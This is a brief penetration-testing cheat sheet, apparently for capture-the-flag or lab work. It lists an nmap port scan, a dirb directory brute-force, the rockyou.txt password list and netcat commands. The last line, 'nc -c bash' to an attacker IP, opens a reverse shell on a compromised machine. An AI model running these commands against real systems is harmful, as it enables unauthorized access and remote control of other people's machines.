* nmap
    - sudo nmap -v -sS -p 1-10000 $TARGET : Scan every TCP port with service discovery
* dirb : directory bruteforce
    - dirb http://webpage.com : The webpage to bruteforce
* rockyou.txt : A large password collection
* nc
    - nc -lp 1337 : Listen to port 1337
    - nc -c bash 10.10.14.188 1337 : If you can execute this on the attacked machine, you will get a reverse shell. (The IP is your machine)